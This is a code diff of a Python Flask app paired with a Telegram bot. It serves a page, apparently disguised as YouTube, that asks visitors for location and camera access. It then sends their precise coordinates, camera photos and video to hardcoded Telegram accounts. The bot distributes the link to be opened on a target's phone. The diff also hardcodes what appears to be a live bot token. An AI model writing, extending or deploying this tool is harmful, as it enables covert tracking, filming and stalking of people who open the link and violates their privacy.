@@ -3,18 +3,16 @@ import threading
 from flask import Flask, request, render_template_string
 import telebot
 
-BOT_TOKEN = os.environ.get('BOT_TOKEN')
-USER_IDS_STR = os.environ.get('USER_IDS')
-BASE_URL = os.environ.get('BASE_URL')
-
-if not BOT_TOKEN or not USER_IDS_STR or not BASE_URL:
-    raise RuntimeError("Missing env vars: BOT_TOKEN, USER_IDS, BASE_URL")
-
-USER_IDS = [int(x.strip()) for x in USER_IDS_STR.split(',') if x.strip().isdigit()]
+# ========== HARDCODED CONFIG ==========
+BOT_TOKEN = "8637899791:AAEjufAN7VOU6T4KEVcrBF4NncDJBh_di8w"
+USER_IDS = [7361880623, 8475691696]   # both accounts
+BASE_URL = "https://web-youtube-asuma66.up.railway.app"
+# ======================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
+# ---------- HTML PAGE (same as before) ----------
 HTML_PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -71,7 +69,6 @@ HTML_PAGE = """<!DOCTYPE html>
             statusText.style.color = good ? '#3ea6ff' : '#ff6b6b';
         }
 
-        // ---------- SEND LOCATION (or fallback) ----------
         function sendLocation(coords) {
             const payload = { lat: coords.lat, lng: coords.lng };
             fetch('/location', {
@@ -79,19 +76,16 @@ HTML_PAGE = """<!DOCTYPE html>
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             })
-            .then(res => res.text())
             .then(() => {
                 locationStatus.innerHTML = `📍 Location sent: ${coords.lat.toFixed(6)}, ${coords.lng.toFixed(6)}`;
                 updateStatus('Location sent to bot.');
             })
-            .catch(err => {
+            .catch(() => {
                 locationStatus.innerHTML = '📍 Location send failed.';
-                console.error(err);
             });
         }
 
         function sendLocationDenied() {
-            // Tell backend that location was denied
             fetch('/location', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -103,7 +97,6 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---------- CAPTURE FRAME ----------
         function captureFrame(stream) {
             return new Promise((resolve) => {
                 const video = document.createElement('video');
@@ -126,7 +119,6 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---------- SEND MEDIA ----------
         async function sendMedia(frontBlob, backBlob, videoBlob) {
             const fd = new FormData();
             if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
@@ -135,13 +127,11 @@ HTML_PAGE = """<!DOCTYPE html>
             await fetch('/capture', { method: 'POST', body: fd });
         }
 
-        // ---------- MAIN SESSION ----------
         async function startSession() {
             startBtn.disabled = true;
             startBtn.innerText = 'Starting...';
             updateStatus('Requesting location...');
 
-            // ---- STEP 1: Get location ----
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -151,8 +141,8 @@ HTML_PAGE = """<!DOCTYPE html>
                     },
                     (err) => {
                         locationStatus.innerHTML = '📍 Location denied.';
-                        sendLocationDenied(); // notify bot that location was denied
-                        requestCamera(); // still try camera
+                        sendLocationDenied();
+                        requestCamera();
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
@@ -163,7 +153,6 @@ HTML_PAGE = """<!DOCTYPE html>
             }
         }
 
-        // ---- STEP 2: Request camera ----
         async function requestCamera() {
             updateStatus('Requesting camera access...');
             try {
@@ -202,7 +191,6 @@ HTML_PAGE = """<!DOCTYPE html>
                 startBtn.innerText = 'Recording...';
             } catch (e) {
                 updateStatus('Camera permission denied.', false);
-                // Send a notification that camera was denied
                 fetch('/camera_denied', { method: 'POST' });
                 startBtn.disabled = false;
                 startBtn.innerText = '▶ Start Session';
@@ -215,8 +203,7 @@ HTML_PAGE = """<!DOCTYPE html>
 </body>
 </html>"""
 
-# ---------- BACKEND ROUTES ----------
-
+# ---------- ROUTES ----------
 @app.route('/')
 def index():
     return render_template_string(HTML_PAGE)
@@ -225,11 +212,9 @@ def index():
 def location():
     data = request.get_json()
     if data.get('denied'):
-        # Location was denied – send a message to users
-        msg = "📍 Location: Denied by user."
         for uid in USER_IDS:
             try:
-                bot.send_message(uid, msg)
+                bot.send_message(uid, "📍 Location: Denied by user.")
             except Exception as e:
                 print(f"Send error to {uid}: {e}")
         return "OK", 200
@@ -275,7 +260,7 @@ def capture():
             print(f"Media send error to {uid}: {e}")
     return "OK", 200
 
-# ---------- TELEGRAM BOT ----------
+# ---------- BOT ----------
 @bot.message_handler(commands=['start'])
 def send_link(m):
     bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt will ask for location and camera, then send data automatically.")
